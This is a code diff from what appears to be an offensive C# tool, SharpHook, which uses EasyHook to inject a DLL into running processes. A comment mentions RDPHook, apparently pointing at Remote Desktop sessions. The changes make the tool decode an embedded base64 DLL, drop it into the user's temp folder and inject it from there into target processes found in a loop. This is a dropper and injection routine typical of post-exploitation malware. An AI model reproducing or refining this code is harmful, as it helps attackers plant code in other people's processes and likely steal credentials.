@@ -31,8 +31,8 @@ namespace SharpHook
 
             // Create the IPC server using the RDPHook IPC.ServiceInterface class as a singleton
             Console.WriteLine("[*] Waiting ...");
-
-            string path = @"PowerHook.dll";
+            string TempFolder = Path.GetTempPath();
+            string path = TempFolder + @"PowerHook.dll";
             bool fileExist = File.Exists(path);
             if (!fileExist)
             {
@@ -42,7 +42,7 @@ namespace SharpHook
             EasyHook.RemoteHooking.IpcCreateServer<PowerHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);
 
             // Get the full path to the assembly we want to inject into the target process
-            string injectionLibrary = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "PowerHook.dll");
+            string injectionLibrary = path;
             while (true)
             {
                 //Reset list of PIDs and get processes
@@ -119,9 +119,9 @@ namespace SharpHook
             
             string base64 = b64Dll;
             byte[] toDLL = Convert.FromBase64String(base64);
-            string DropDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
-            File.WriteAllBytes(DropDir + @"\" + "PowerHook" + ".dll", toDLL);
-            Console.WriteLine("[*] Loaded " + "PowerHook" + ".dll");
+            string DropDir = Path.GetTempPath();
+            File.WriteAllBytes(DropDir + @"PowerHook.dll", toDLL);
+            Console.WriteLine("[*] Loaded PowerHook.dll");
             
         }
 
